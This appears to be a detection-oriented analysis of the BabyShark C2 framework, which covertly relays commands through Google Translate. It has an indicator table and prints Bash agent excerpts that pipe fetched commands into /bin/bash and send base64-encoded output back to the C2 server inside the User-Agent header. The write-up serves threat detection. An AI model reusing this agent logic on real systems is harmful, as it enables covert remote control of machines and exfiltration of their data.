# BabyShark

## Table of Contents

- [BabyShark](#babyshark)
  - [Table of Contents](#table-of-contents)
  - [Metadata](#metadata)
  - [Description](#description)
  - [Documentation](#documentation)
  - [Indicators](#indicators)
  - [Capabilities](#capabilities)
    - [Execute Commands via SHELL](#execute-commands-via-shell)
    - [Send Results via USER-AGENT](#send-results-via-user-agent)
  - [Functionalities](#functionalities)
    - [namedpipe](#namedpipe)
    - [getUrls](#geturls)

## Metadata

- Evaluator(s): [Nasreddine Bencherchali (@nas_bench)](https://twitter.com/nas_bench)
- Date: 24/01/2022
- Modified: 24/01/2022
- Source: [BabyShark](https://github.com/UnkL4b/BabyShark#agents-model)
- Implementation: Bash

## Description

> BabyShark C2 is a generic C2 that uses Google Translator as C&C channel

## Documentation

- [Understanding & Detecting C2 Frameworks — BabyShark](https://nasbench.medium.com/understanding-detecting-c2-frameworks-babyshark-641be4595845)

## Indicators

| Description        | Indicator                                                                                                          | Reference                          |
|--------------------|--------------------------------------------------------------------------------------------------------------------|------------------------------------|
| HTTP GET Request   | ```https://translate.google.com/translate?&anno=2&u=[c2server]``` | [Get URLs](#geturls) |
| C2 URL   | ```http[:]//[C2 IP]/momyshark?key=[SECRET KEY]``` |  |
| User-Agent   | ```Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36``` | [Get URLs](#geturls) |
| Process Creation   | ```curl --silent [URL] -H [USER-AGENT]``` | [Get URLs](#geturls) |
| Process Creation   | ```xmllint --html --xpath '//iframe/@src' - 2>/dev/null``` | [Get URLs](#geturls) |
| Process Creation   | ```xmllint --html --xpath '//span[@class="google-src-text"]/text()' - 2>/dev/null``` | [Get URLs](#geturls) |
| Process Creation   | ```xmllint --html --xpath '/html/body/main/div/div/div/div/ul/li/span/text()' - 2>/dev/null``` | [Get URLs](#geturls) |
| Process Creation   | ```cut -d "=" -f2-``` | [Get URLs](#geturls) |
| Process Creation   | ```tr -d '"'``` | [Get URLs](#geturls) |
| Process Creation   | ```sed 's/amp;//g'``` | [Get URLs](#geturls) |
| Process Creation   | ```rm /tmp/input /tmp/output``` | [Named PIPE](#namedpipe) |
| Process Creation   | ```mkfifo /tmp/input``` | [Named PIPE](#namedpipe) |
| Process Creation   | ```tail -f /tmp/input | /bin/bash 2>&1 > /tmp/output``` | [Named PIPE](#namedpipe) |
| File Creation   | ```/tmp/input``` | [Named PIPE](#namedpipe) |
| File Creation   | ```/tmp/output``` | [Named PIPE](#namedpipe) |

## Capabilities

### Execute Commands via SHELL

- Description: Execute commands sent from channel on the host
- Source Reference:
  - https://github.com/UnkL4b/BabyShark/blob/master/README.md#agents-model
- Indicators:
  - Command is sent via the named pipe created beforehand and execute via `bash` and the output is written in the `$output` variable

    ```bash
    function namedpipe(){
    rm "$input" "$output"
    mkfifo "$input"
    tail -f "$input" | /bin/bash 2>&1 > $output &
    }
    .....
    echo "$command" > "$input"
    sleep 2
    ```

### Send Results via USER-AGENT

- Description: Send results of the executed commands via the User-Agent
- Source Reference:
  - https://github.com/UnkL4b/BabyShark/blob/master/README.md#agents-model
- Indicators:
  - HTTP request sent with a custom User-Agent with the following template: `User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36 | [Base64 Encoded String] | [ID]`

    ```bash
    function getcommand(){
    if [[ "$result" ]];then  
        command=$(curl -L --silent $second -H "$result" )
    .....
    result="$user_agent | $outputb64 | $idcommand "
    ```

## Functionalities

### namedpipe

- Description: The agent start by creating a named pipe and an output file. The pipe will be used to receive the commands and the output file will contain the results.
- Source Reference:
  - https://github.com/UnkL4b/BabyShark/blob/master/README.md#agents-model
- Indicators:
  - Usage of the binary `/bin/rm` to delete files: `rm /tmp/input /tmp/output`
  - Usage of the binary `/usr/bin/mkfifo` to create Named PIPE: `mkfifo /tmp/input`
  - Usage of the binary `/usr/bin/tail` to PIPE the results to the binary `/bin/bash` and the output file: `/tmp/output`

    ```bash
    input="/tmp/input"
    output="/tmp/output"

    function namedpipe(){
    rm "$input" "$output"
    mkfifo "$input"
    tail -f "$input" | /bin/bash 2>&1 > $output &
    }
    ```

### getUrls

- Description: The agent will request multiple times the different google translate URL's in a certain order to extract commands.
- Source Reference:
  - https://github.com/UnkL4b/BabyShark/blob/master/README.md#agents-model
- Indicators:
  - Usa of the following binaries: `curl`, `xmllint`, `cut`, `sed`, `tr`

    ```bash
    function getfirsturl(){
        url="https://translate.google.com/translate?&anno=2&u=$c2server"
        first=$(curl --silent "$url" -H "$user_agent" | xmllint --html --xpath '//iframe/@src' - 2>/dev/null | cut -d "=" -f2- | tr -d '"' | sed 's/amp;//g' )
    } 

    function getsecondurl(){
        second=$(curl --silent -L "$first" -H "$user_agent"  | xmllint --html --xpath '//a/@href' - 2>/dev/null | cut -d "=" -f2- | tr -d '"' | sed 's/amp;//g')
    }

    function getcommand(){
        if [[ "$result" ]];then  
            command=$(curl -L --silent $second -H "$result" )
        else
            command=$(curl -L --silent $second -H "$user_agent" )

            command1=$(echo "$command" | xmllint --html --xpath '//span[@class="google-src-text"]/text()' - 2>/dev/null)
            command2=$(echo "$command" | xmllint --html --xpath '/html/body/main/div/div/div/div/ul/li/span/text()' - 2>/dev/null )
            if [[ "$command1" ]];then
            command="$command1"
            else
            command="$command2"
            fi
        fi
    }

    function talktotranslate(){
        getfirsturl
        getsecondurl
        getcommand
    }
    ```
